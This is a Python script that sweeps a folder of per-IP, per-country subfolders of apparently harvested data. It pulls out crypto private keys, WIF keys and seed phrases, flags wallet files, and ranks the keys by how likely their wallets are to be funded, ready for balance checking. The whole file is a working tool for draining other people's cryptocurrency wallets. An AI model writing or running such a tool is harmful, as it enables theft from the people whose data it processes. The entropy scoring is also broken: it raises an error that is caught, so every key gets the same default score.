#!/usr/bin/env python3
"""
🎯 NET607 COMPREHENSIVE HUNTER
==============================
Advanced analysis and extraction system for NET607 directory.
Organizes keys by funding likelihood and prepares for balance checking.
"""

import os
import json
import time
import glob
import hashlib
import re
from datetime import datetime
from pathlib import Path
from collections import Counter, defaultdict

class NET607Hunter:
    def __init__(self):
        self.base_dir = "net607"
        self.results = {
            'total_directories': 0,
            'total_files': 0, 
            'extracted_keys': [],
            'country_stats': defaultdict(int),
            'file_types': defaultdict(int),
            'key_patterns': defaultdict(list),
            'high_value_indicators': [],
            'extraction_errors': []
        }
        
    def analyze_directory_structure(self):
        """Analyze the NET607 directory structure"""
        print("🔍 ANALYZING NET607 DIRECTORY STRUCTURE")
        print("=" * 50)
        
        countries = defaultdict(int)
        total_dirs = 0
        
        for item in os.listdir(self.base_dir):
            if os.path.isdir(os.path.join(self.base_dir, item)):
                total_dirs += 1
                # Extract country code
                if item.startswith('[') and ']' in item:
                    country = item.split(']')[0][1:]
                    countries[country] += 1
        
        self.results['total_directories'] = total_dirs
        self.results['country_stats'] = dict(countries)
        
        print(f"📊 Total IP Directories: {total_dirs}")
        print(f"🌍 Countries Represented: {len(countries)}")
        print(f"\n🏆 TOP COUNTRIES:")
        for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True)[:10]:
            print(f"    {country}: {count} directories")
    
    def extract_keys_from_directory(self, dir_path):
        """Extract all possible keys from a directory"""
        keys_found = []
        
        try:
            for root, dirs, files in os.walk(dir_path):
                self.results['total_files'] += len(files)
                
                for file in files:
                    file_path = os.path.join(root, file)
                    file_ext = os.path.splitext(file)[1].lower()
                    self.results['file_types'][file_ext] += 1
                    
                    try:
                        # Try to read file content
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                        
                        # Extract potential private keys
                        found_keys = self.extract_private_keys_from_content(content, file_path)
                        keys_found.extend(found_keys)
                        
                        # Look for wallet files
                        if any(wallet_indicator in file.lower() for wallet_indicator in 
                              ['wallet', 'keystore', 'private', 'seed', 'mnemonic', 'keys']):
                            self.results['high_value_indicators'].append({
                                'file': file_path,
                                'type': 'wallet_file',
                                'size': os.path.getsize(file_path)
                            })
                            
                    except Exception as e:
                        self.results['extraction_errors'].append(f"{file_path}: {str(e)}")
                        
        except Exception as e:
            self.results['extraction_errors'].append(f"{dir_path}: {str(e)}")
            
        return keys_found
    
    def extract_private_keys_from_content(self, content, source_file):
        """Extract private keys from content using multiple patterns"""
        keys_found = []
        
        # Multiple key patterns
        patterns = [
            # 64-character hex (standard private key)
            r'\b[a-fA-F0-9]{64}\b',
            # 66-character hex with 0x prefix
            r'\b0x[a-fA-F0-9]{64}\b',
            # Base64 encoded keys (44 chars)
            r'\b[A-Za-z0-9+/]{44}={0,2}\b',
            # WIF format (starts with 5, K, L)
            r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b',
            # Potential seed phrases (12/24 words)
            r'\b(?:[a-z]{3,8}\s+){11,23}[a-z]{3,8}\b'
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                key_info = {
                    'key': match,
                    'source': source_file,
                    'pattern_type': pattern,
                    'length': len(match),
                    'entropy_score': self.calculate_entropy_score(match),
                    'format': self.identify_key_format(match)
                }
                keys_found.append(key_info)
                
        return keys_found
    
    def calculate_entropy_score(self, key_string):
        """Calculate entropy score for key quality assessment"""
        try:
            # Character frequency entropy
            char_counts = Counter(key_string.lower())
            total_chars = len(key_string)
            entropy = -sum((count/total_chars) * 
                          (count/total_chars).bit_length() 
                          for count in char_counts.values())
            
            # Pattern bonuses/penalties
            bonus = 0
            
            # High entropy patterns
            if len(set(key_string)) > len(key_string) * 0.8:
                bonus += 0.2
                
            # Avoid obvious patterns
            if '000000' in key_string or '111111' in key_string:
                bonus -= 0.3
            if key_string == key_string[0] * len(key_string):
                bonus -= 0.5
                
            return min(max(entropy + bonus, 0), 1.0)
            
        except:
            return 0.5
    
    def identify_key_format(self, key_string):
        """Identify the format of the key"""
        key = key_string.strip()
        
        if len(key) == 64 and all(c in '0123456789abcdefABCDEF' for c in key):
            return 'hex_private_key'
        elif key.startswith('0x') and len(key) == 66:
            return 'hex_private_key_prefixed' 
        elif len(key) in [44, 45] and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in key):
            return 'base64_encoded'
        elif key[0] in '5KL' and len(key) in [51, 52]:
            return 'wif_private_key'
        elif len(key.split()) in [12, 15, 18, 21, 24]:
            return 'mnemonic_seed'
        else:
            return 'unknown'
    
    def prioritize_keys_by_funding_likelihood(self):
        """Prioritize extracted keys by likelihood of being funded"""
        print("\n🎯 PRIORITIZING KEYS BY FUNDING LIKELIHOOD")
        print("=" * 50)
        
        prioritized_keys = []
        
        for key_info in self.results['extracted_keys']:
            priority_score = 0
            
            # Format scoring
            format_scores = {
                'hex_private_key': 0.8,
                'hex_private_key_prefixed': 0.8,
                'wif_private_key': 0.9,
                'base64_encoded': 0.6,
                'mnemonic_seed': 0.95,
                'unknown': 0.2
            }
            priority_score += format_scores.get(key_info['format'], 0.2)
            
            # Entropy scoring
            priority_score += key_info['entropy_score'] * 0.3
            
            # Source file scoring
            source_lower = key_info['source'].lower()
            if any(indicator in source_lower for indicator in 
                  ['wallet', 'keystore', 'private', 'bitcoin', 'ethereum', 'crypto']):
                priority_score += 0.4
            if any(indicator in source_lower for indicator in 
                  ['backup', 'export', 'keys', 'seed']):
                priority_score += 0.3
                
            # Country/IP scoring (some regions more likely to have active wallets)
            country_code = self.extract_country_from_source(key_info['source'])
            high_value_countries = ['US', 'CN', 'DE', 'JP', 'KR', 'SG', 'CH']
            if country_code in high_value_countries:
                priority_score += 0.2
                
            key_info['priority_score'] = min(priority_score, 1.0)
            prioritized_keys.append(key_info)
        
        # Sort by priority score
        prioritized_keys.sort(key=lambda x: x['priority_score'], reverse=True)
        
        print(f"📊 Keys Prioritized: {len(prioritized_keys)}")
        if prioritized_keys:
            print(f"🏆 Highest Priority Score: {prioritized_keys[0]['priority_score']:.3f}")
            print(f"📉 Lowest Priority Score: {prioritized_keys[-1]['priority_score']:.3f}")
        
        return prioritized_keys
    
    def extract_country_from_source(self, source_path):
        """Extract country code from source path"""
        try:
            if '[' in source_path and ']' in source_path:
                return source_path.split('[')[1].split(']')[0]
        except:
            pass
        return 'UNKNOWN'
    
    def process_all_directories(self):
        """Process all directories in NET607"""
        print(f"\n⚡ PROCESSING ALL NET607 DIRECTORIES")
        print("=" * 50)
        
        processed_count = 0
        total_keys = 0
        
        directories = [d for d in os.listdir(self.base_dir) 
                      if os.path.isdir(os.path.join(self.base_dir, d))]
        
        for i, directory in enumerate(directories, 1):
            dir_path = os.path.join(self.base_dir, directory)
            
            print(f"🔍 [{i}/{len(directories)}] Processing {directory}")
            
            keys_from_dir = self.extract_keys_from_directory(dir_path)
            self.results['extracted_keys'].extend(keys_from_dir)
            total_keys += len(keys_from_dir)
            processed_count += 1
            
            # Progress update every 50 directories
            if i % 50 == 0:
                print(f"    📊 Progress: {i}/{len(directories)} dirs, {total_keys} keys found")
        
        print(f"\n✅ PROCESSING COMPLETE")
        print(f"    📁 Directories Processed: {processed_count}")
        print(f"    🔑 Total Keys Extracted: {total_keys}")
        print(f"    📄 Total Files Scanned: {self.results['total_files']}")
    
    def save_results(self):
        """Save all results to organized files"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Prioritize keys
        prioritized_keys = self.prioritize_keys_by_funding_likelihood()
        
        # Save high-priority keys
        high_priority_keys = [k for k in prioritized_keys if k['priority_score'] >= 0.7]
        medium_priority_keys = [k for k in prioritized_keys if 0.4 <= k['priority_score'] < 0.7]
        low_priority_keys = [k for k in prioritized_keys if k['priority_score'] < 0.4]
        
        # Save to files
        results_data = {
            'extraction_timestamp': timestamp,
            'summary': {
                'total_directories': self.results['total_directories'],
                'total_files': self.results['total_files'],
                'total_keys': len(prioritized_keys),
                'high_priority_keys': len(high_priority_keys),
                'medium_priority_keys': len(medium_priority_keys),
                'low_priority_keys': len(low_priority_keys)
            },
            'country_stats': self.results['country_stats'],
            'file_types': self.results['file_types'],
            'high_priority_keys': high_priority_keys,
            'medium_priority_keys': medium_priority_keys,
            'low_priority_keys': low_priority_keys,
            'high_value_indicators': self.results['high_value_indicators'],
            'extraction_errors': self.results['extraction_errors'][:100]  # Limit errors
        }
        
        output_file = f"NET607_EXTRACTION_{timestamp}.json"
        with open(output_file, 'w') as f:
            json.dump(results_data, f, indent=2)
        
        print(f"\n💾 RESULTS SAVED:")
        print(f"    📄 Full Results: {output_file}")
        print(f"    🏆 High Priority: {len(high_priority_keys)} keys")
        print(f"    ⭐ Medium Priority: {len(medium_priority_keys)} keys")
        print(f"    📝 Low Priority: {len(low_priority_keys)} keys")
        
        return output_file, prioritized_keys
    
    def generate_summary_report(self):
        """Generate comprehensive summary report"""
        print(f"\n📊 NET607 EXTRACTION SUMMARY")
        print("=" * 50)
        
        print(f"🌍 GEOGRAPHIC DISTRIBUTION:")
        for country, count in sorted(self.results['country_stats'].items(), 
                                   key=lambda x: x[1], reverse=True)[:15]:
            print(f"    {country}: {count} directories")
        
        print(f"\n📄 FILE TYPE ANALYSIS:")
        for ext, count in sorted(self.results['file_types'].items(), 
                               key=lambda x: x[1], reverse=True)[:10]:
            ext_display = ext if ext else '(no extension)'
            print(f"    {ext_display}: {count} files")
        
        if self.results['high_value_indicators']:
            print(f"\n🎯 HIGH-VALUE INDICATORS:")
            for indicator in self.results['high_value_indicators'][:10]:
                print(f"    {indicator['type']}: {indicator['file']} ({indicator['size']} bytes)")

def main():
    """Main execution function"""
    print("🎯 NET607 COMPREHENSIVE HUNTER")
    print("=" * 50)
    print(f"🕐 Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    hunter = NET607Hunter()
    
    # Check if NET607 directory exists
    if not os.path.exists(hunter.base_dir):
        print(f"❌ ERROR: {hunter.base_dir} directory not found!")
        return
    
    # Step 1: Analyze structure
    hunter.analyze_directory_structure()
    
    # Step 2: Process all directories
    hunter.process_all_directories()
    
    # Step 3: Generate summary
    hunter.generate_summary_report()
    
    # Step 4: Save results
    output_file, prioritized_keys = hunter.save_results()
    
    print(f"\n🎉 NET607 EXTRACTION COMPLETE!")
    print(f"⏱️  Total Time: {time.time() - start_time:.1f} seconds")
    print(f"🎯 Ready for balance checking with prioritized key list!")
    
    return output_file, prioritized_keys

if __name__ == "__main__":
    start_time = time.time()
    main()
